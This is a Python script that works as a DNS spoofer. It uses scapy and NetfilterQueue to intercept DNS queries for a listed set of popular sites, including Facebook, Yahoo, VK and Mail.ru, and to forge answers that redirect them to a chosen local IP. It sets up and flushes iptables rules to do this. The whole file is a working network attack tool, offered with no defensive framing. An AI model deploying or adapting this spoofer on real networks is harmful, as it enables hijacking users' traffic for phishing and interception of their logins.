#! /usr/bin/env python3

# Browser DNS chrome://net-internals/dns#dns
# Read info http://www.networksorcery.com/enp/protocol/dns.htm#QR
# https://www.chromium.org/hsts
# https://cs.chromium.org/chromium/src/net/http/transport_security_state_static.json

from scapy.all import *
from netfilterqueue import NetfilterQueue


# Build spoof pool for test

spoof_pool= [
    'bbc.com.',
    'vk.com.',
    'm.vk.com.',
    'ukr.net.',
    'mail.ru.',
    'yahoo.com.',
    'rambler.com.',
    'facebook.com.'
    ]

class DnsSpooferNetFilter():

    def __init__(self, ipaddress, debug=False):
        self.redirect = ipaddress
        self.debug = debug

    def wrapper(self, qname):
        for key in spoof_pool:
            if key in qname:
                return True
        return False

    def response_msg(self, pkt):
        qtype = pkt[DNS].qd.qtype

        if qtype!=28:
            # if qtype != IPV6
            answer= DNSRR(
                rrname=pkt[DNS].qd.qname.decode(),
                type=pkt[DNS].qd.qtype,
                ttl=1200,
                rdata=self.redirect
            )

            question = DNSQR(
                qname=pkt[DNS].qd.qname.decode(),
                qtype=pkt[DNS].qd.qtype,
                qclass=pkt[DNS].qd.qclass
            )

            ip_layer = IP(
                dst=pkt[IP].src,
                src=pkt[IP].dst
                )
            udp_layer = UDP(
                dport=pkt[UDP].sport,
                sport=pkt[UDP].dport
            )
            dns_layer = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=question,
                an=answer
            )

            new_payload = ip_layer / udp_layer / dns_layer

            return new_payload
        else:
            return pkt

    def callback(self, packet):
        payload = packet.get_payload()
        pkt = IP(payload)


        if not pkt.haslayer(DNSQR):
            packet.accept()

        else:
            qname = pkt[DNS].qd.qname.decode()

            if self.debug:
                print(
                    'else-block: {decor}\n'
                    '{payload}\n'
                    'else-block: {decor}\n'.format(decor='-'*60, payload=pkt._do_summary())

                )
            if self.wrapper(qname):

                new_payload = self.response_msg(pkt)
                if self.debug:
                    print(
                        'payload block: {decor}\n'
                        '{payload}\n'
                        'payload block: {decor}\n'.format(decor='-' * 60, payload=payload)
                    )
                    print()
                    new_payload.show()

                packet.set_payload(new_payload.build())

                for _ in range(100):
                    send(new_payload, verbose=True)

                packet.accept()


            else:
                packet.accept()

    def main(self):
        try:
            self.q = NetfilterQueue()
            self.q.bind(0,self.callback)
            self.q.run()
        except KeyboardInterrupt:
            self.stop()
        except Exception as error:
            print('[-] Exception {error}'.format(error=error))

    def start(self):
        print('DNS Netfilter Start....')
        #iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1
        command = [
            'iptables',
            '-A',
            'OUTPUT',
            '-p',
            'udp',
            '--dport',
            '53',
            '-j',
            'NFQUEUE',
        ]
        if self.subprocess_call(command=command):
            self.main()
        else:
            import sys
            sys.exit()

    def stop(self):
        print('Stop Proxy change IP tables')
        command = [
            'iptables',
            '-X'
        ]
        command2 = [
            'iptables',
            '-F'
        ]
        self.subprocess_call(command=command)
        self.subprocess_call(command=command2)

    def subprocess_call(self,command):
        call = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = call.stdout.read()
        error = call.stderr.read()
        if error.__len__() !=0:
            print(error.decode())
            return False

        else:
            print(output.decode())
            return True


if __name__ == "__main__":
    dns = DnsSpooferNetFilter(ipaddress='192.168.0.105', debug=True)
    dns.start()